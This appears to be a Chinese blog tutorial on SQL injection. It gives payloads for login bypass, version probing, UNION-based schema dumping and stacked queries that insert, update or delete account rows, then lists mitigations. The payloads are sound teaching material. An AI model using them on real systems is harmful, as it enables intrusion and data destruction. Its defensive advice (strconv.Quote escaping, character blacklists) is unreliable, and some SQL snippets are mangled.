---
title: 技术场景之解决sql注入
cover:  /img/technology-sense/sql_inject_title.png
subtitle: 技术场景之解决sql注入
categories: "技术场景"
tags: "技术场景"
author:
nick: 袁苏东
link: https://github.com/yuansudong
typora-root-url: images
---

以前的无知,造就了一场场线上事故,现在回想起来,不忍想象.而这篇文章,主要聊聊SQL注入.曾经的自己,因为没有对接口参数进行规范化处理,导致了数据库被恶意客户端把数据库爬得一干二净.当时非常气恼,现在回想起来,我还要谢谢那个人,谢谢你没有把数据库的数据全给我清空.



### 1.什么是SQL注入



SQL注入,指服务器接口对用户输入数据的合法性没有判断或过滤不严,导致恶意客户端可以通过在参数中加入SQL语句,从而欺骗数据库,达到非正常授权的操作.



### 2.注入类型

 

### 01.数字型注入



当输入的参数为整型时，如ID、年龄、时间戳等，如果存在注入漏洞，则可以认为是数字型注入.



数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型.



比如，参数id=10，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1，则会推导为string类型，这是弱类型语言的特性.



而对于Go,Java,C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞 .



### 02.字符型注入



当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合.



通过在字符型参数里,进行主动闭合.便可以让数据库忽略后续的查询条件.



比如,登录场景.用户需要填写用户名和密码,通过服务器进行验证,倘若密码以及用户名,服务器便会方法令牌,允许用户登录.



以前的一个同事大致是这么写的.



```
SELECT {{需要的数据}} FROM Account WHERE Account.UserName = @Username AND Account.Password = md5(@Password);
```



对于上面的SQL,只谈UserName不谈Password.



恶意客户端,可以通过在参数UserName中,植入SQL语句,达到不输入密码,只要用户名在数据库中存在,就可以访问系统的目的.



比如,恶意客户端在接口参数的UserName中,填入的是 admin" -- ,而服务器接口也没有对字符串参数进行处理.



直接将值放入SQL语句中,会构建出如下的SQL语句.



```sql
SELECT {{需要的数据}} FROM Account WHERE Account.UserName = "admin" --" AND Account.Password = md5(@Password);
```



从上面的颜色就可以看出,通过此等输入方式,后面的SQL语句就被注释掉了.



倘若根据这位同事的代码逻辑,这个登录接口就成了不需要密码登录的接口.



sql注入能干什么用途?



这一部分,我们以下列语句来事实SQL语句的注入,看一看SQL注入,到底能干些什么事情



```sql
SELECT * FROM Account WHERE Account.UserName = @UserName AND Password = @Password
```



### 01.通过SQL注入,获取数据库的版本



```
SELECT*FROM AccountWHERE Account.UserName = "user01"       AND mid(version(),1,3) = 8.0 -- " AND Password = @Password
```



倘若能够正常返回,或者返回期望的错误码,则证明该数据库的版本是8.0



### 02.获取数据表中的数据库信息



```sql
SELECT
	{{你需要的数据}}
FROM AccountWHERE Account.UserName = "user01" AND 0 = 1 UNION SELECT         information_schema.`COLUMNS`.TABLE_SCHEMA,        information_schema.`COLUMNS`.TABLE_NAME,        information_schema.`COLUMNS`.COLUMN_NAME,        information_schema.`COLUMNS`.IS_NULLABLE,        information_schema.`COLUMNS`.DATA_TYPE,        information_schema.`COLUMNS`.COLUMN_COMMENT,        information_schema.`COLUMNS`.COLUMN_KEY        FROM information_schema.`COLUMNS` WHERE information_schema.`COLUMNS`
```



### 03.获取数据库名称和当前用户名



```sql
SELECT
	{{需要的数据}}
FROM AccountWHERE Account.UserName = "user01" UNION SELECT 1,2,version(),user(),database() -- " AND Password = @Password
```



对于我的实验环境来说,返回的数据就是如下



```text
UserName  Password  Id      DeletedAt           CreatedAt1          2        8.0.21  root@192.168.42.1   SQL
```



### 04.新增数据



获取到数据库的信息后,我们就可以通过注入SQL语句,达到新增数据的目的.比如,下面的SQL语句.



```sql
SELECT * FROM Account
WHERE Account.UserName = "user01";INSERT INTO `SQL`.`Account`( `UserName`, `Password`, `CreatedAt`, `UpdatedAt`, `DeletedAt`) VALUES ('admin', 'md5(sasa)', '2021-01-03 17:03:51', '2021-01-03 17:03:54', '2021-01-03 17:03:57'); -- " AND Password = @Password
```



通过上述的SQL注入,就可以在数据库为SQL,数据表为Account的表中插入一行数据.



05.修改数据



```sql
SELECT * FROM Account
WHERE Account.UserName = "user01";UPDATE `SQL`.`Account`SET  Password = 'md5(new_password)'WHERE `SQL`.`Account`.UserName = "user01" -- " AND Password = @Password
```



通过上述的SQL注入,便可以达到修改其他用户密码的目的.恶意客户端修改密码之后,就可以登录,窃取相应的个人用户信息或者执行一些恶意操作.



### 06.删除数据



```sql
SELECT * FROM Account
WHERE Account.UserName = "user01";

DELETE FROM `SQL`.`Account` -- " AND Password = @Password
```



通过注入上述的SQL语句,可以达到在执行查询的同时, 清楚SQL.Account表.



### 07.如何避免注入



A.为每个账号非配一定的数据库权限.

B.对于强类型语言,接口中的字符串参数需要转义处理.比如golang中的strconv.Quote.

C.检查参数中是否包含着特殊字符.比如,;,#,--,/**/,',"等信息.

D.通过sqlmap工具进行盲注测试.